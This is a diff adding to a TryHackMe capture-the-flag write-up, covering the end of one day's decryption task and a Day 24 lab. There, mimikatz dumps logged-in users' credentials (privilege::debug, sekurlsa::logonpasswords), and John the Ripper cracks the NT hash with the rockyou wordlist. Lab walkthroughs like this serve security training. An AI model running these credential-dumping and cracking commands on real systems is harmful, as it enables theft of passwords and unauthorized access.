@@ -254,19 +254,39 @@ copy encrypted data and key in above step into the decryptor.ps1 script to obtai
 
 ![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/a56a7426-518c-44a5-a108-46fae58c9799)
 
+Answer:
+
+![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/45788c3f-11a9-4d79-a8a8-1e2416547151)
+
 ## Day 24: Learning From The Grinch
 
+open cmd, redirect to mimikatz x64 and execute it
 
+```
+cd C:\Users\Administrator\Desktop\mimikatz\x64
+mimikatz.exe
+```
 
+check privilege
 
+```
+privilege::debug
+```
 
+extract credentials for currently logged in users
 
+```
+sekurlsa::logonpasswords
+```
 
+![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/4439fc2c-b2dc-4eff-af64-cedc6a27daed)
 
+crack it hash with john the ripper
 
+```
+john –format=NT -w=/usr/share/wordlists/rockyou.txt hash.txt –pot=output.txt
+```
 
+Answer:
 
-
-
-
-
+![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/3bda91e6-6f02-4148-bbac-1b1338b83d99)
